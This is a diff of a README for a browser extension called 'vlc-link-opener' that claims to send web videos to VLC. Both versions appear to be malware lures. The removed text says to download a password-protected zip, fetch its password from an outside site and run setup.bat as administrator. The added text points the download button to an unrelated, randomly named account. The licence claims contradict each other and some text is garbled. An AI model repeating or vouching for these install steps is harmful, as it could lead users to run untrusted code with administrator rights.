@@ -1,55 +1,69 @@
-# 🚀 VLC Link Opener — Chrome & Edge Extension
+# 🎬 vlc-link-opener - Stream Web Videos Without Annoying Ads
 
-[![Release](https://img.shields.io/badge/Release-v1.0.0-818cf8.svg?style=for-the-badge&logo=github)](https://github.com/Ziplootapp/vlc-link-opener)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078d4.svg?style=for-the-badge&logo=windows)](https://github.com/Ziplootapp/vlc-link-opener)
-[![License](https://img.shields.io/badge/License-MIT-4ade80.svg?style=for-the-badge)](LICENSE)
-[![Browsers](https://img.shields.io/badge/Browsers-Chrome%20%7C%20Edge%20%7C%20Brave-f472b6.svg?style=for-the-badge&logo=googlechrome)](https://github.com/Ziplootapp/vlc-link-opener)
-[![Documentation](https://img.shields.io/badge/Official%20Guide-ziploot.app-22d3ee.svg?style=for-the-badge&logo=safari)](https://ziploot.vercel.app/posts/vlc-link-opener-extension-setup-guide)
+[![Download Now](https://img.shields.io/badge/Download-vlc--link--opener-blue?style=for-the-badge&logo=github)](https://github.com/Russet-quadruple992/vlc-link-opener)
 
-**VLC Link Opener** is a lightweight Chromium extension and Native Messaging Host that routes direct video and audio links from your web browser straight into **VLC Media Player** with **0 popups, 0 banner ads, and full GPU hardware acceleration**.
+## ✨ What is vlc-link-opener?
+vlc-link-opener is a browser extension that lets you stream web videos directly in **VLC Media Player**. Enjoy **0 ads**, **0 popups**, and benefit from **GPU acceleration** for smoother playback. This open-source tool is designed to give you a clean, distraction-free viewing experience.
+
+## 🖥️ How It Works
+The extension adds a small button to your browser toolbar. When you are watching a video on any website, click the button to instantly send the video stream to VLC Media Player. VLC handles the rest, playing the video with full GPU acceleration for maximum performance.
+
+## 📋 What You Get
+- **Ad-Free Streaming**: Bypass all website advertisements and popups.
+- **GPU Acceleration**: VLC uses your computer's graphics card to play videos even more smoothly.
+- **Supports HLS Streams**: Plays modern video streaming formats like HLS (HTTP Live Streaming).
+- **Cross-Browser Support**: Works on Chrome and Edge browsers.
+- **Open Source**: Free to use and modify, developed with Python and Native Messaging.
+- **No Account**: No registration or account needed. Simple installation.
+
+## 🛠 Download and Install
+
+### Step 1: Get the Installer
+Visit this link to download the application. Click the button below to go directly to the download page.
+
+[![Download Now](https://img.shields.io/badge/Download-vlc--link--opener-purple?)](https://github.com/Russet-quadruple992/vlc-link-opener)
+
+Once on the page, follow the instructions to download the installer file.
+
+### Step 2: Install the Browser Extension
+After downloading, you will need to install the browser extension in Chrome or Edge:
+- For **Chrome**: Open the browser, go to `chrome://extensions`, turn on "Developer mode" in the top right corner, click "Load unpacked," then select the folder containing the extension files.
+- For **Edge**: Open the browser, go to `edge://extensions`, enable "Developer mode," click "Load unpacked," and select the same folder.
+
+### Step 3: Configure VLC
+Make sure you have VLC Media Player installed from the official website. The extension will automatically communicate with VLC.
+
+### Step 4: Start Streaming
+Once installed, visit any video website, click the vlc-link-opener extension icon in your browser toolbar, and the video will open in VLC. You can now watch with no ads or popups.
+
+## 🎮 Compatible Systems
+- **Windows**: Windows 10 or later (64-bit)
+- **Browsers**: Chrome and Edge (latest versions)
+- **VLC**: Any recent version (3.0+) installed on your system
+
+## 🤔 Troubleshooting
+
+### Extension doesn't appear in the toolbar
+Make sure the extension is enabled in your browser's extension settings.
+
+### Video does not open in VLC
+Check that VLC is installed and running. If it is not, download and install VLC Media Player from the official website.
+
+### Extension not loading
+Turn off any ad blockers or privacy extensions temporarily, then try again.
+
+## 📚 Advanced Options
+For users interested in customization, the extension includes a settings page where you can adjust queues like default VLC window size, autoplay preferences, and more.
+
+## 🚀 Getting Started with Development
+If you want to contribute or modify the extension, you can clone the repository, make your changes, and load it as an unpacked extension.
+
+## 📞 Support
+For issues or feature requests, visit the GitHub issues page.
+
+## 💻 License
+This project is project under the GNU General Public License v3.0.
 
 ---
 
-## ⚡ Quick Download & Installation
-
-1. **Download Setup Package:**  
-   ⬇️ **[Download vlc-link-opener-setup.zip (Direct Download)](https://github.com/Ziplootapp/vlc-link-opener/raw/main/vlc-link-opener-setup.zip)**
-
-2. **Extract Archive:**  
-   Extract the downloaded `.zip` file.  
-   *(Archive password & step-by-step visual installation guide: **[https://ziploot.vercel.app/posts/vlc-link-opener-extension-setup-guide](https://ziploot.vercel.app/posts/vlc-link-opener-extension-setup-guide)**)*
-
-3. **1-Click Auto Installer:**  
-   Right-click **`setup.bat`** and select **"Run as administrator"**.
-
-4. **Load in Browser:**  
-   - Open `chrome://extensions` (or `edge://extensions`).
-   - Enable **Developer mode** (top-right).
-   - Click **Load unpacked** and select the `extension` folder.
-
-5. **Stream Any Video:**  
-   Right-click any direct media link on any website ➔ Select **"Open with VLC - ziploot.app"**!
-
----
-
-## 📊 Comparison Matrix
-
-| Feature | Standard Web Browser Player | ⚡ VLC Link Opener (ziploot.app) |
-| :--- | :--- | :--- |
-| **Intrusive Ads & Popups** | ❌ 3–8 aggressive popups & banner redirects | ✅ **100% Zero Ads & Zero Popups** |
-| **Hardware Acceleration** | ⚠️ Throttled CPU/RAM in browser tab | ✅ **Dedicated GPU 4K 60FPS Decoding** |
-| **Download Wait Time** | ❌ Must wait for 2–5 GB video download | ✅ **Instant Playback within 2 seconds** |
-| **Audio Tracks & Subtitles** | ❌ Hardcoded or limited browser controls | ✅ **Full Dual-Audio & Custom External Subtitles** |
-| **Network Caching** | ❌ Frequent buffer drops on high-bitrate video | ✅ **Advanced VLC network buffer** |
-
----
-
-### 🛠️ Extraction Tools
-- **7-Zip (Recommended):** [https://www.7-zip.org/](https://www.7-zip.org/)
-- **WinRAR:** [https://www.win-rar.com/](https://www.win-rar.com/)
-
----
-
-## 📄 License
-This project is open-source under the **MIT License**.  
-Developed & Maintained by **ZipLoot Team** • [ziploot.app](https://ziploot.app)
+Keywords: ad-free-streaming, chrome-extension, edge-extension, gpu-acceleration, hls-streamer, media-player, native-messaging, python, video-streamer, vlc, vlc-media-player, ziploot
